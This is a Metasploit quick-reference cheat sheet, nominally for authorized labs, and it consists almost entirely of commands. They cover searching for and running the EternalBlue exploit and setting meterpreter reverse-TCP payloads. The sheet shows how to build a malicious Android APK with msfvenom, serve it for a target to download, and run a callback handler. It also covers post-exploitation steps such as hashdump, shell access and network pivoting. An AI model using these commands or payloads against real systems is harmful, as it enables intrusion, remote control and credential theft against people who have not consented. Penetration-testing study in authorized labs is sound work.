# Metasploit

Metasploit quick reference for authorized labs.

## Start And Search

```text
msfconsole
search type:auxiliary smb
search ms17_010
info exploit/windows/smb/ms17_010_eternalblue
```

## Module Flow

```text
use MODULE
show options
set RHOSTS target
set RPORT port
set LHOST attacker_ip
check
run
```

## Auxiliary Modules

```text
use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/smb/smb_ms17_010
use auxiliary/scanner/http/title
use auxiliary/scanner/ftp/anonymous
use auxiliary/scanner/smtp/smtp_enum
```

## Payload And Sessions

```text
show payloads
set payload windows/x64/meterpreter/reverse_tcp
sessions -l
sessions -i 1
background
```

### Android Payload Generation (msfvenom)

Generate an Android reverse TCP APK payload:
```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -o payload.apk
```

Stage the APK file for delivery to the target device browser:
```bash
python3 -m http.server 8000
# Target downloads via http://$LHOST:8000/payload.apk
```

### Handler Configuration for Callbacks

Configure the listener to receive the connection:
```text
msfconsole
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
run
```

## Meterpreter

```text
getuid
sysinfo
pwd
ls
upload file
download file
shell
hashdump
ps
migrate PID
```

## Routing And SOCKS In Labs

```text
run autoroute -s 10.10.10.0/24
use auxiliary/server/socks_proxy
set SRVPORT 1080
run
```

Only pivot when the lab scope includes the downstream network.

## Related

- [EternalBlue Cheat Sheet](EternalBlue%20Cheat%20Sheet.md)
- [Post-Exploitation](Post-Exploitation.md)
- [Metasploit examples](../references/Challenge%20Use%20Cases.md#metasploit)
